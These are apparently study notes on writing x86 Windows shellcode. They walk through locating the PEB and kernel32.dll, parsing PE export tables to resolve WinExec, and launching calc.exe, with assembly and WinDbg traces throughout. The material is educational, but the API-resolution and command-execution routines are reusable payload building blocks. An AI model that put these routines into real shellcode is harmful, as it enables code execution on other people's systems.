Windows x86 Shellcode Reference

Goal

This document summarizes the important Windows structures and assembly operations involved in:

1. Walking the PEB
2. Locating kernel32.dll
3. Parsing PE headers
4. Locating the export directory

This intentionally omits unnecessary fields and focuses only on offsets commonly used in x86 shellcode.

⸻

High-Level Flow

fs:[0x30]
    ↓
PEB
    ↓
PEB_LDR_DATA
    ↓
InInitializationOrderModuleList
    ↓
_LDR_DATA_TABLE_ENTRY
    ↓
kernel32.dll base
    ↓
IMAGE_DOS_HEADER
    ↓
IMAGE_NT_HEADERS32
    ↓
IMAGE_EXPORT_DIRECTORY

⸻

Step 1 — Locate the PEB

Assembly

xor ecx, ecx
mov eax, fs:[ecx+0x30]

Explanation

On x86 Windows:

fs:[0x30] = PEB pointer

After execution:

EAX = PEB

⸻

_PEB Structure

Important Offsets

Offset	Field	Purpose
+0x0c	Ldr	Pointer to PEB_LDR_DATA

Relevant Structure

typedef struct _PEB {
    ...
    PPEB_LDR_DATA Ldr; // +0x0c
    ...
} PEB;

⸻

Step 2 — Locate PEB_LDR_DATA

Assembly

mov eax, [eax+0x0c]

Explanation

Reads:

PEB->Ldr

After execution:

EAX = PEB_LDR_DATA

⸻

_PEB_LDR_DATA Structure

Important Offsets

Offset	Field	Purpose
+0x1c	InInitializationOrderModuleList	Loader linked list

Relevant Structure

typedef struct _PEB_LDR_DATA {
    ...
    LIST_ENTRY InInitializationOrderModuleList; // +0x1c
    ...
} PEB_LDR_DATA;

⸻

Step 3 — Enter Loader List

Assembly

mov eax, [eax+0x1c]

Explanation

Reads:

PEB_LDR_DATA.InInitializationOrderModuleList.Flink

IMPORTANT:

This does NOT return:

_LDR_DATA_TABLE_ENTRY

It returns:

pointer to LIST_ENTRY

inside _LDR_DATA_TABLE_ENTRY.

After execution:

EAX = LIST_ENTRY pointer

⸻

LIST_ENTRY Concept

Structure

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY;

Important Concept

Windows intrusive linked lists point to:

embedded LIST_ENTRY fields

NOT:

the parent structure base

⸻

_LDR_DATA_TABLE_ENTRY Structure

Relevant Fields

Offset	Field
+0x10	InInitializationOrderLinks
+0x18	DllBase
+0x2c	BaseDllName
+0x30	BaseDllName.Buffer

Relevant Structure

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;           // +0x00
    LIST_ENTRY InMemoryOrderLinks;         // +0x08
    LIST_ENTRY InInitializationOrderLinks; // +0x10
    PVOID DllBase;                         // +0x18
    UNICODE_STRING FullDllName;            // +0x24
    UNICODE_STRING BaseDllName;            // +0x2c
} LDR_DATA_TABLE_ENTRY;

⸻

Step 4 — Recover Structure Base

Assembly

sub eax, 0x10

Explanation

The LIST_ENTRY pointer points to:

_LDR_DATA_TABLE_ENTRY + 0x10

because:

InInitializationOrderLinks = offset 0x10

Therefore:

LIST_ENTRY pointer - 0x10 = structure base

After execution:

EAX = _LDR_DATA_TABLE_ENTRY

⸻

Step 5 — Walk Modules

Assembly

mov eax, [eax+0x10]
sub eax, 0x10

Explanation

Reads:

current_module->InInitializationOrderLinks.Flink

which returns:

next LIST_ENTRY pointer

Then:

subtract 0x10

recovers:

next _LDR_DATA_TABLE_ENTRY

⸻

Step 6 — Locate kernel32.dll

Common Shellcode Technique

Compare selected UTF-16 characters.

Example

mov esi, [eax+0x30]
cmp word ptr [esi], 0x004b
jne next
cmp word ptr [esi+2], 0x0045
jne next
cmp word ptr [esi+12], 0x0033
jne next

Explanation

Checks:

KERNEL32.DLL

UTF-16 bytes:

4b 00 65 00 72 00 6e 00 65 00 6c 00 33 00
 K     e     r     n     e     l     3

⸻

Step 7 — Save kernel32 Base

Assembly

mov ebx, [eax+0x18]

Explanation

Reads:

_LDR_DATA_TABLE_ENTRY.DllBase

After execution:

EBX = kernel32.dll base

Validate in WinDbg:

db @ebx L2

Expected:

4d 5a

which is:

MZ

⸻

Step 8 — Locate PE Header

IMAGE_DOS_HEADER

Important Offset

Offset	Field
+0x3c	e_lfanew

Relevant Structure

typedef struct _IMAGE_DOS_HEADER {
    ...
    LONG e_lfanew; // +0x3c
} IMAGE_DOS_HEADER;

Assembly

mov eax, [ebx+0x3c]
add eax, ebx

Explanation

e_lfanew is:

RVA to PE header

So:

PE Header VA = DllBase + e_lfanew

After execution:

EAX = IMAGE_NT_HEADERS32

Validate:

db @eax L4

Expected:

50 45 00 00

which is:

PE\0\0

⸻

Step 9 — Locate Export Directory

Important Offset

Offset	Meaning
+0x78	Export Directory RVA

Assembly

mov eax, [eax+0x78]
add eax, ebx

Explanation

Reads:

OptionalHeader.DataDirectory[EXPORT].VirtualAddress

This is an RVA.

Adding the module base converts:

RVA → VA

After execution:

EAX = IMAGE_EXPORT_DIRECTORY

⸻

IMAGE_EXPORT_DIRECTORY Structure

Important Fields

Offset	Field
+0x1c	AddressOfFunctions
+0x20	AddressOfNames
+0x24	AddressOfNameOrdinals

Relevant Structure

typedef struct _IMAGE_EXPORT_DIRECTORY {
    ...
    DWORD AddressOfFunctions;      // +0x1c
    DWORD AddressOfNames;          // +0x20
    DWORD AddressOfNameOrdinals;   // +0x24
} IMAGE_EXPORT_DIRECTORY;

⸻

RVA vs VA

RVA

Relative Virtual Address:

offset from module base

VA

Virtual Address:

actual memory address

Common Pattern

mov eax, [something]
add eax, ebx

means:

convert RVA → VA

⸻

WinDbg Validation Commands

View registers

r

Disassemble

u @eip

Dump memory

dd @eax

Dump bytes

db @eax

Dump ASCII

da @eax

Dump Unicode

du @eax

Inspect structures

dt _PEB @eax
dt _PEB_LDR_DATA @eax
dt _LDR_DATA_TABLE_ENTRY @eax
dt _IMAGE_EXPORT_DIRECTORY @eax

⸻

Key Concepts

LIST_ENTRY pointers are NOT structure bases

LIST_ENTRY pointers reference:

embedded list nodes

inside larger structures.

Recover the structure base using:

pointer_to_field - field_offset

⸻

PE files heavily use RVAs

Most PE structures store:

offsets from image base

not absolute addresses.

Converting:

RVA → VA

is one of the core shellcode tasks.



# e_lfanew Notes
## Purpose
`e_lfanew` is a field inside the DOS header (`IMAGE_DOS_HEADER`).
Its purpose is:
```text
Point to the PE header.

More specifically:

Offset from image base to IMAGE_NT_HEADERS

⸻

IMAGE_DOS_HEADER

Relevant structure:

typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;      // "MZ"
    ...
    LONG e_lfanew;     // Offset to PE header
} IMAGE_DOS_HEADER;

Important offsets:

Offset	Meaning
+0x00	DOS Signature (MZ)
+0x3c	e_lfanew

⸻

Memory Layout Example

Suppose:

kernel32.dll base = 0x76d60000

Memory:

76d60000  4d 5a                ; MZ
...
76d6003c  f8 00 00 00          ; e_lfanew = 0xf8
...
76d600f8  50 45 00 00          ; PE\\0\\0

⸻

Meaning of e_lfanew

At:

DllBase + 0x3c

Windows stores:

offset to PE header

Example:

e_lfanew = 0xf8

Meaning:

PE header starts 0xf8 bytes after module base.

⸻

Common Shellcode Pattern

Step 1 — Read e_lfanew

mov eax, [ebx+0x3c]

Where:

EBX = module base

After execution:

EAX = e_lfanew offset

NOT:

PE header address

⸻

Step 2 — Convert Offset to Address

add eax, ebx

Now:

EAX = actual PE header address

⸻

Validation in WinDbg

Verify DOS Header

db @ebx L2

Expected:

4d 5a

Which is:

MZ

⸻

Read e_lfanew

dd @ebx+0x3c L1

Example:

76d6003c  000000f8

⸻

Verify PE Header

db @ebx+poi(@ebx+0x3c) L4

Expected:

50 45 00 00

Which is:

PE\\0\\0

⸻

Important Concepts

e_lfanew is NOT the PE Signature

Wrong:

DllBase + 0x3c = PE header

Correct:

DllBase + 0x3c = offset TO the PE header

⸻

RVA vs VA

e_lfanew behaves like an RVA:

Type	Meaning
RVA	Offset from image base
VA	Actual memory address

Common shellcode pattern:

mov eax, [something]
add eax, ebx

Meaning:

Convert RVA/offset → VA

⸻

Why Windows Uses e_lfanew

PE files begin with a DOS header and DOS stub for historical compatibility.

The PE header is not guaranteed to begin at a fixed offset.

Therefore:

e_lfanew

tells Windows where the PE header actually starts.

⸻

Important PE Parsing Offsets

Offset	Meaning
+0x00	MZ
+0x3c	e_lfanew
+0x78	Export Directory RVA

These are foundational offsets for x86 Windows shellcode.




WinExec

```txt
EAX = IMAGE_EXPORT_DIRECTORY
EBX = kernel32 base
ECX = matched name index
ESI = "WinExec" string address
```

```asm
mov edx, [eax+0x24]      ; AddressOfNameOrdinals RVA
add edx, ebx             ; AddressOfNameOrdinals VA

xor esi, esi
mov si, [edx+ecx*2]      ; ESI = ordinal

mov edi, [eax+0x1c]      ; AddressOfFunctions RVA
add edi, ebx             ; AddressOfFunctions VA

mov esi, [edi+esi*4]     ; ESI = WinExec RVA
add esi, ebx             ; ESI = WinExec VA

int3
```

```txt
IMAGE_EXPORT_DIRECTORY
│
├── AddressOfNames --------┐
├── AddressOfNameOrdinals -┼--> linked by INDEX
└── AddressOfFunctions ----┘
```
```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    ...
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;

    DWORD AddressOfFunctions;      // RVA to DWORD array
    DWORD AddressOfNames;          // RVA to DWORD array
    DWORD AddressOfNameOrdinals;   // RVA to WORD array
} IMAGE_EXPORT_DIRECTORY;
```

```txt
names[605] -> "WinExec"
ordinals[605] -> 1421
```

```txt
names[i]
    ↓
ordinals[i]
    ↓
functions[ ordinal ]
```

⸻

What These Arrays Actually Contain

1. AddressOfNames

Type:

DWORD names[]

Contents:

RVA of ASCII export names

Example:

Index	Value
0	RVA -> “AcquireSRWLockExclusive”
1	RVA -> “AcquireSRWLockShared”
2	RVA -> “ActivateActCtx”
…	…
605	RVA -> “WinExec”

⸻

2. AddressOfNameOrdinals

Type:

WORD ordinals[]

Contents:

ordinal index corresponding to names[i]

Example:
```
Index	Value
0	17
1	18
2	301
…	…
605	1421
```
Important:

The INDEX matches AddressOfNames.

So:
```
names[605] -> "WinExec"
ordinals[605] -> 1421
```
⸻

3. AddressOfFunctions

Type:

DWORD functions[]

Contents:

RVA of actual exported function code

Example:
```
Index	Value
17	RVA -> function
18	RVA -> function
301	RVA -> function
1421	RVA -> WinExec
```

Step 1 — Find export name

You looped:
```asm
mov esi, [AddressOfNames + ecx*4]
```
This loads:

name RVA

Then:
```asm
add esi, ebx
```
Now:

ESI -> "WinExec"

⸻

Step 2 — Use SAME index into ordinals[]

You then do:
```asm
mov si, [AddressOfNameOrdinals + ecx*2]
```
Now:

ESI = ordinal

NOT:

function RVA

⸻

Step 3 — Use ordinal as function index

Now:
```asm
mov esi, [AddressOfFunctions + esi*4]
```
This means:

functions[ordinal]

Result:

ESI = WinExec RVA

⸻

Step 4 — Convert RVA → VA
```asm
add esi, ebx
```
Now:

ESI = actual WinExec address

⸻

Visual Example

Suppose:

names[605] -> "WinExec"

Then:

ordinals[605] = 1421

Then:

functions[1421] = 0x000671f0

Then:

kernel32_base + 0x000671f0
    =
76dc71f0

Which becomes:

KERNEL32!WinExec

⸻


```txt
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=011b0000 esi=76de9263 edi=76ddd33c
eip=011b0064 esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b0064 7404            je      011b006a                                [br=1]
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=011b0000 esi=76de9263 edi=76ddd33c
eip=011b006a esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b006a 8b5024          mov     edx,dword ptr [eax+24h] ds:0023:76ddba14=0007ec60
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=0007ec60 esi=76de9263 edi=76ddd33c
eip=011b006d esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b006d 01da            add     edx,ebx
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76de9263 edi=76ddd33c
eip=011b006f esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
011b006f 31f6            xor     esi,esi
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=00000000 edi=76ddd33c
eip=011b0071 esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b0071 668b344a        mov     si,word ptr [edx+ecx*2]  ds:0023:76ddf86c=0606
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=00000606 edi=76ddd33c
eip=011b0075 esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b0075 8b781c          mov     edi,dword ptr [eax+1Ch] ds:0023:76ddba0c=0007ba18
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=00000606 edi=0007ba18
eip=011b0078 esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011b0078 01df            add     edi,ebx
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=00000606 edi=76ddba18
eip=011b007a esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
011b007a 8b34b7          mov     esi,dword ptr [edi+esi*4] ds:0023:76ddd230=000671f0
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=000671f0 edi=76ddba18
eip=011b007d esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
011b007d 01de            add     esi,ebx
0:003> t
eax=76ddb9f0 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=76ddba18
eip=011b007f esp=02a0f1fd ebp=02a0f804 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
011b007f cc              int     3
0:003> u @esi
KERNEL32!WinExec:
76dc71f0 8bff            mov     edi,edi
76dc71f2 55              push    ebp
76dc71f3 8bec            mov     ebp,esp
76dc71f5 83e4f8          and     esp,0FFFFFFF8h
76dc71f8 81ec8c000000    sub     esp,8Ch
76dc71fe a140a1de76      mov     eax,dword ptr [KERNEL32!__security_cookie (76dea140)]
76dc7203 33c4            xor     eax,esp
76dc7205 89842488000000  mov     dword ptr [esp+88h],eax
0:003> x kernel32!WinExec
76dc71f0          KERNEL32!WinExec (_WinExec@8)

```

### Call WinExec

```c
WinExec("calc.exe", 1);
```

#### WinExec Prototype
```c
UINT WinExec(
    LPCSTR lpCmdLine,
    UINT   uCmdShow
);
```

```asm
push 1
push ptr_to_calc_string
call esi
```

Need this string in memory:
```txt
"calc.exe\\0"
```

```asm
xor eax, eax
push eax
push 0x6578652e     ; ".exe"
push 0x636c6163     ; "calc"

mov edi, esp
```

```txt
EDI -> "calc.exe"
```

Then:
```asm
push 1
push edi
call esi
```

#### Pop calc.exe

```txt
0:004> u @esi
KERNEL32!WinExec:
76dc71f0 8bff            mov     edi,edi
76dc71f2 55              push    ebp
76dc71f3 8bec            mov     ebp,esp
76dc71f5 83e4f8          and     esp,0FFFFFFF8h
76dc71f8 81ec8c000000    sub     esp,8Ch
76dc71fe a140a1de76      mov     eax,dword ptr [KERNEL32!__security_cookie (76dea140)]
76dc7203 33c4            xor     eax,esp
76dc7205 89842488000000  mov     dword ptr [esp+88h],eax
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=76ddba18
eip=026c0082 esp=028bf8b9 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0082 50              push    eax
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=76ddba18
eip=026c0083 esp=028bf8b5 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0083 682e657865      push    6578652Eh
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=76ddba18
eip=026c0088 esp=028bf8b1 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0088 6863616c63      push    636C6163h
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=76ddba18
eip=026c008d esp=028bf8ad ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c008d 89e7            mov     edi,esp
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=028bf8ad
eip=026c008f esp=028bf8ad ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c008f 6a01            push    1
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=028bf8ad
eip=026c0091 esp=028bf8a9 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0091 57              push    edi
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=028bf8ad
eip=026c0092 esp=028bf8a5 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0092 cc              int     3
0:004> dd @esp L4
028bf8a5  028bf8ad 00000001 636c6163 6578652e
0:004> da poi(@esp)
028bf8ad  "calc.exe"
0:004> t
eax=00000000 ebx=76d60000 ecx=00000606 edx=76ddec60 esi=76dc71f0 edi=028bf8ad
eip=026c0093 esp=028bf8a5 ebp=028bfec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026c0093 ffd6            call    esi {KERNEL32!WinExec (76dc71f0)}
0:004> g
ModLoad: 732e0000 732ef000   C:\Windows\SYSTEM32\kernel.appcore.dll
eax=00000024 ebx=008f0000 ecx=00dbf768 edx=76f43060 esi=00000000 edi=76fd1a20
eip=76f43060 esp=00dbf768 ebp=00dbf77c iopl=0         nv up ei pl zr na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000247
ntdll!KiFastSystemCallRet:
76f43060 c3              ret
```